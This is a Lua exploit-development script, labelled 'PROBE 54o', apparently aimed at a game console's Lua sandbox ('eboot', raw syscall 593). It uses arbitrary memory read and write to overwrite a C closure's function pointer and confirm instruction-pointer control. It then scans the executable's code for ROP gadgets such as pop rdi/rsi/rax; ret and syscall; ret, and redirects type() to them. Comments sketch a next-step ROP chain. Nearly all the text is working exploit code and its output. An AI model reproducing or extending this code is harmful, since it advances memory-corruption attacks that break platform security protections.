-- CRASH_CLASS: HIGH
-- PROBE 54o: Controlled C function pointer redirect at +0x20
--
-- Context: 54n confirmed +0x20 is the real C function pointer for CClosure.
-- Redirecting type()'s +0x20 to a RET gadget crashed (execution diverted but
-- returned with bad rax, corrupting VM). This probe:
-- 1) Control test: redirect type's +0x20 to tostring's C func (swap behavior)
-- 2) Redirect type's +0x20 to pairs' C func (different behavior)
-- 3) Scan eboot for useful gadgets (xor eax,eax;ret or similar)
-- 4) Try getpid shellcode via GPU page (even if W^X blocks, crash type tells us)
--
-- If step 1 makes type() behave like tostring(), we have CONFIRMED
-- instruction pointer control on a C closure.

print("=== PROBE 54o: CONTROLLED C FUNC REDIRECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(": ([0-9a-fA-F]+)") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

-- Step 1: Get addresses and C func pointers (+0x20)
print("[*] Step 1: Read C function pointers")

local type_addr = parse_func_addr(type)
local tostring_addr = parse_func_addr(tostring)
local pcall_addr = parse_func_addr(pcall)

if not type_addr or not tostring_addr or not pcall_addr then
    print("  FAILED to parse function addresses")
    print("=== PROBE 54o ABORTED ===")
    return
end

local type_cfunc = safe_rq(type_addr + 0x20)
local tostring_cfunc = safe_rq(tostring_addr + 0x20)
local pcall_cfunc = safe_rq(pcall_addr + 0x20)

print("  type     at " .. hexval(type_addr) .. "  +0x20 = " .. hexval(type_cfunc))
print("  tostring at " .. hexval(tostring_addr) .. "  +0x20 = " .. hexval(tostring_cfunc))
print("  pcall    at " .. hexval(pcall_addr) .. "  +0x20 = " .. hexval(pcall_cfunc))

-- Baseline
print("")
print("  Baseline: type(42) = " .. tostring(type(42)))
print("  Baseline: type('hi') = " .. tostring(type("hi")))
print("  Baseline: tostring(42) = " .. tostring(tostring(42)))

-- Step 2: CONTROL — redirect type's +0x20 to tostring's C func
print("")
print("[*] Step 2: Redirect type() -> tostring()'s C func")
print("  If type(42) returns '42' instead of 'number', we control execution")

collectgarbage("stop")

local old_type_cfunc = safe_rq(type_addr + 0x20)
safe_wq(type_addr + 0x20, tostring_cfunc)

local verify = safe_rq(type_addr + 0x20)
print("  Wrote: " .. hexval(tostring_cfunc))
print("  Verify: " .. hexval(verify))

-- Call type() — should now behave like tostring()
local ok1, ret1 = pcall(function() return type(42) end)
if ok1 then
    print("  type(42) = " .. tostring(ret1) .. "  (expect '42' if redirected, 'number' if not)")
    if ret1 == "42" then
        print("  >>> CONFIRMED: type() now behaves as tostring()!")
        print("  >>> WE HAVE INSTRUCTION POINTER CONTROL!")
    elseif ret1 == "number" then
        print("  >>> No effect — +0x20 might not be the right offset after all")
    else
        print("  >>> Unexpected result: " .. tostring(ret1))
    end
else
    print("  type(42) CRASHED: " .. tostring(ret1))
end

-- Restore immediately
safe_wq(type_addr + 0x20, old_type_cfunc)

-- Verify restore
local ok2, ret2 = pcall(function() return type(42) end)
print("  After restore: type(42) = " .. tostring(ret2))

collectgarbage("restart")

-- Step 3: Scan eboot for useful gadgets
print("")
print("[*] Step 3: Eboot gadget scan")

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local text_size_lo = safe_rd(info + 0x110)

if not text_lo or not text_hi then
    print("  Could not get eboot base")
    print("=== PROBE 54o DONE (partial) ===")
    return
end

local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("  eboot .text: " .. hexval(eboot) .. " size: " .. string.format("0x%X", text_size_lo or 0))

-- Scan for gadgets in first 64KB of eboot
-- Looking for:
-- 0xC3           = ret
-- 0xC390         = ret; nop
-- 0x31C0C3       = xor eax,eax; ret  (return 0)
-- 0x48C7C0xxC3   = mov rax, imm8; ret
-- 0xB8xxxxxxC3   = mov eax, imm32; ret
-- 0x0F05         = syscall
-- 0x0F05C3       = syscall; ret

local gadgets_found = 0
local ret_gadget = nil
local xor_eax_ret = nil
local syscall_ret = nil
local mov_eax_ret = {}

for off = 0, 0xFFFF do
    local dw = safe_rd(eboot + off)
    if dw then
        -- Check for xor eax, eax; ret (31 C0 C3)
        if (dw % 0x1000000) == 0xC3C031 then
            if not xor_eax_ret then
                xor_eax_ret = off
                print(string.format("  GADGET: xor eax,eax; ret at eboot+0x%X", off))
                gadgets_found = gadgets_found + 1
            end
        end
        -- Check for syscall; ret (0F 05 C3)
        if (dw % 0x1000000) == 0xC3050F then
            if not syscall_ret then
                syscall_ret = off
                print(string.format("  GADGET: syscall; ret at eboot+0x%X", off))
                gadgets_found = gadgets_found + 1
            end
        end
        -- Check for ret (C3) as first byte
        if (dw % 256) == 0xC3 and not ret_gadget then
            ret_gadget = off
            -- Don't print, we already know this exists
        end
        -- Check for mov eax, imm32; ret (B8 xx xx xx xx C3)
        -- B8 is first byte of dword, then next dword starts with xx C3
        if (dw % 256) == 0xB8 and #mov_eax_ret < 5 then
            local next_dw = safe_rd(eboot + off + 4)
            if next_dw then
                local next_b1 = next_dw % 256
                if next_b1 == 0xC3 then
                    local imm = math.floor(dw / 256)
                    table.insert(mov_eax_ret, {off=off, imm=imm})
                    print(string.format("  GADGET: mov eax, 0x%X; ret at eboot+0x%X", imm, off))
                    gadgets_found = gadgets_found + 1
                end
            end
        end
        -- Check for pop rdi; ret (5F C3)
        if (dw % 0x10000) == 0xC35F then
            print(string.format("  GADGET: pop rdi; ret at eboot+0x%X", off))
            gadgets_found = gadgets_found + 1
        end
        -- Check for pop rsi; ret (5E C3)
        if (dw % 0x10000) == 0xC35E then
            print(string.format("  GADGET: pop rsi; ret at eboot+0x%X", off))
            gadgets_found = gadgets_found + 1
        end
        -- Check for pop rdx; ret (5A C3)
        if (dw % 0x10000) == 0xC35A then
            print(string.format("  GADGET: pop rdx; ret at eboot+0x%X", off))
            gadgets_found = gadgets_found + 1
        end
        -- Check for pop rax; ret (58 C3)
        if (dw % 0x10000) == 0xC358 then
            print(string.format("  GADGET: pop rax; ret at eboot+0x%X", off))
            gadgets_found = gadgets_found + 1
        end
    end
    -- Limit output
    if gadgets_found >= 30 then
        print("  (stopping scan at 30 gadgets)")
        break
    end
end

print(string.format("  Total gadgets found: %d (in first 64KB)", gadgets_found))

-- Step 4: If we have syscall;ret, try getpid via ROP
if syscall_ret then
    print("")
    print("[*] Step 4: Try getpid via syscall;ret gadget")

    -- The C function calling convention for Lua C functions is:
    -- int func(lua_State *L)
    -- rdi = lua_State pointer
    -- The function should push results on the Lua stack and return count
    --
    -- If we redirect to syscall;ret:
    -- rdi = lua_State (will be used as syscall arg1)
    -- rax = ??? (syscall number depends on what's in rax)
    --
    -- We need to set rax = 20 (getpid) first
    -- Need: pop rax; ret -> 20 -> syscall; ret
    -- But we only control the initial jump, not the stack...
    --
    -- Actually, when the VM calls the C function:
    -- The stack has the return address, then whatever the VM pushed
    -- If we jump to a pop rax; ret gadget, rax = return_addr, then
    -- we jump to whatever was next on stack
    --
    -- This is getting into ROP territory. For now, just test what
    -- happens with a direct syscall;ret redirect.

    local sc_gadget_lo = text_lo + syscall_ret
    local sc_gadget_hi = text_hi
    if sc_gadget_lo >= 0x100000000 then
        sc_gadget_hi = sc_gadget_hi + 1
        sc_gadget_lo = sc_gadget_lo - 0x100000000
    end
    local sc_gadget = uint64(string.format("0x%X%08X", sc_gadget_hi, sc_gadget_lo))
    print("  syscall;ret at: " .. hexval(sc_gadget))
    print("  WARNING: rax is unknown, this will execute an unpredictable syscall")
    print("  Skipping direct syscall redirect (too dangerous)")
end

-- Step 5: Try xor eax,eax;ret (safe — just returns 0)
if xor_eax_ret then
    print("")
    print("[*] Step 5: Redirect type() to xor eax,eax;ret")
    print("  This should make type() return 0 pushed results (empty)")

    local gadget_lo = text_lo + xor_eax_ret
    local gadget_hi = text_hi
    if gadget_lo >= 0x100000000 then
        gadget_hi = gadget_hi + 1
        gadget_lo = gadget_lo - 0x100000000
    end
    local gadget = uint64(string.format("0x%X%08X", gadget_hi, gadget_lo))
    print("  gadget at: " .. hexval(gadget))

    collectgarbage("stop")
    local old = safe_rq(type_addr + 0x20)
    safe_wq(type_addr + 0x20, gadget)

    local ok, ret = pcall(function() return type(42) end)
    if ok then
        print("  type(42) = " .. tostring(ret) .. " (type: " .. type(ret) .. ")")
        if ret == nil then
            print("  >>> Returned nil — gadget executed, returned 0 results!")
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end

    safe_wq(type_addr + 0x20, old)
    collectgarbage("restart")

    local ok2, ret2 = pcall(function() return type(42) end)
    print("  After restore: type(42) = " .. tostring(ret2))
end

-- Step 6: If we found mov eax, N; ret gadgets, test one
if #mov_eax_ret > 0 then
    print("")
    print("[*] Step 6: Redirect type() to mov eax, N; ret")
    local g = mov_eax_ret[1]
    print(string.format("  Using mov eax, 0x%X; ret at eboot+0x%X", g.imm, g.off))

    local gadget_lo = text_lo + g.off
    local gadget_hi = text_hi
    if gadget_lo >= 0x100000000 then
        gadget_hi = gadget_hi + 1
        gadget_lo = gadget_lo - 0x100000000
    end
    local gadget = uint64(string.format("0x%X%08X", gadget_hi, gadget_lo))

    collectgarbage("stop")
    local old = safe_rq(type_addr + 0x20)
    safe_wq(type_addr + 0x20, gadget)

    local ok, ret = pcall(function() return type(42) end)
    if ok then
        print("  type(42) = " .. tostring(ret) .. " (type: " .. type(ret) .. ")")
        print(string.format("  >>> Gadget returned %d results to Lua", g.imm))
    else
        print("  CRASHED: " .. tostring(ret))
    end

    safe_wq(type_addr + 0x20, old)
    collectgarbage("restart")

    local ok2, ret2 = pcall(function() return type(42) end)
    print("  After restore: type(42) = " .. tostring(ret2))
end

print("")
print("=== PROBE 54o COMPLETE ===")
